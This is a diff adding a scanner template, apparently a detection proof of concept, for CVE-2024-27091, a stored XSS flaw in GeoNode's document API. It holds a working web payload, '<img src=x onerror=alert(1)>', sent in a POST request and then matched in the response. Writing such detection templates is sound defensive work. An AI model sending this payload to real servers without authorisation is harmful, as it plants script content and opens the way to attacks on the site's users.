@@ -1,0 +1,34 @@
+[info]
+author = "AVE"
+description = "GeoNode rich text editor stored XSS vulnerability detection via document creation API"
+id = "POC-AVE-2024-0004"
+name = "CVE-2024-27091 PoC"
+severity = "medium"
+tags = [
+    "cve-2024-27091",
+    "geonode",
+    "xss",
+    "stored-xss",
+]
+vuln_id = [
+    "CVE-2024-27091",
+    "AVE-2024-0004",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v2/documents/"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"title":"test","doc_type":"text","content":"<img src=x onerror=alert(1)>"}'
+type = "json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
